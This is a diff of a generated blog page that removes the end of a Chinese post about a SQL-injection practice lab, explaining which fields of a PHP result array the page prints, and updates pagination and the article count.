-<p>进一步讨论原因，打开php文件探究：<br>修改PHP文件代码发现$row 是一个有六个元素的数组，其中id是第一个值，后面两个分别是username和passsword。他输出的是后面两个即username和passsword<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/联合3.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -2381,7 +2319,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">70</span>
+                    <span class="site-state-item-count">72</span>
                     <span class="site-state-item-name">Artikel</span>
                   </a>
                 </div>
